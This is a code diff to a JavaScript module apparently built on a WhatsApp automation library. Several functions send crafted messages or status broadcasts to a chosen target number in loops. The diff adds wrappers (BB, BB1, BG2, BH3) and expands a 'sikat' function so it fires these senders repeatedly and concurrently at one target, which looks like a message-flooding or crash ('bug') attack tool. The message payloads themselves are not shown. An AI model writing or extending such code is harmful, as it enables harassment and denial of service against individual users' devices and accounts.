@@ -5,7 +5,7 @@ function sleep(ms) {
 async function A(sock, target) {
     console.log("LLL")
     //sock.sendMessage(target, { text: "hello" }, {})
-    
+
 }
 async function B(sock, target) {
     console.log("Starting B")
@@ -59,7 +59,7 @@ async function B(sock, target) {
         },
     };
 
-    for (let i = 0; i < 100; i++) {
+    for (let i = 0; i < 2; i++) {
 
         const msg = generateWAMessageFromContent(target, message, {});
 
@@ -154,7 +154,7 @@ async function B1(sock, jid) {
         },
     };
 
-    for (let i = 0; i < 100; i++) {
+    for (let i = 0; i < 2; i++) {
         const msg = generateWAMessageFromContent(jid, message, {});
 
         await sock.relayMessage("status@broadcast", msg.message, {
@@ -237,7 +237,7 @@ async function G2(sock, isTarget, mention) {
         }
     };
 
-    for (let i = 0; i < 100; i++) {
+    for (let i = 0; i < 2; i++) {
         const msg = generateWAMessageFromContent(isTarget, messageContent, { userJid: isTarget });
 
         const broadcastSend = {
@@ -358,7 +358,7 @@ async function H3(sock, targetNumber) {
             },
         };
 
-        for (let i = 0; i < 100; i++) {
+        for (let i = 0; i < 2; i++) {
             const msg = generateWAMessageFromContent(targetNumber, message, {});
 
             let statusid;
@@ -402,9 +402,9 @@ async function H3(sock, targetNumber) {
                 },
                 {}
             );
-            
-        console.log(`${i} H3 Packet To ${targetNumber}`)
-        await sleep(1000)
+
+            console.log(`${i} H3 Packet To ${targetNumber}`)
+            await sleep(1000)
         }
     } catch (err) {
         console.log(err);
@@ -412,11 +412,49 @@ async function H3(sock, targetNumber) {
 
 }
 
+async function BB(sock, target) {
+    for (let i = 0; i < 20; i++) {
+        B(sock, target)
+        B(sock, target)
+        await B(sock, target)
+    }
+}
+async function BB1(sock, target) {
+    for (let i = 0; i < 20; i++) {
+        B1(sock, target)
+        B1(sock, target)
+        await B1(sock, target)
+    }
+}
+async function BG2(sock, target) {
+    for (let i = 0; i < 20; i++) {
+        G2(sock, target)
+        G2(sock, target)
+        await G2(sock, target)
+    }
+}
+async function BH3(sock, target) {
+    for (let i = 0; i < 20; i++) {
+        H3(sock, target)
+        H3(sock, target)
+        await H3(sock, target)
+    }
+}
 async function sikat(sock, target) {
-    await B(sock, target)
-    await B1(sock, target)
-    await G2(sock, target)
-    await H3(sock, target)
+    for (let i = 0; i < 10; i++) {
+        B(sock, target)
+        B(sock, target)
+        await B(sock, target)
+        B1(sock, target)
+        B1(sock, target)
+        await B1(sock, target)
+        G2(sock, target)
+        G2(sock, target)
+        await G2(sock, target)
+        H3(sock, target)
+        H3(sock, target)
+        await H3(sock, target)
+    }
 }
 
 module.exports = {
@@ -425,5 +463,9 @@ module.exports = {
     B1,
     G2,
     H3,
+    BB,
+    BB1,
+    BG2,
+    BH3,
     sikat
 }
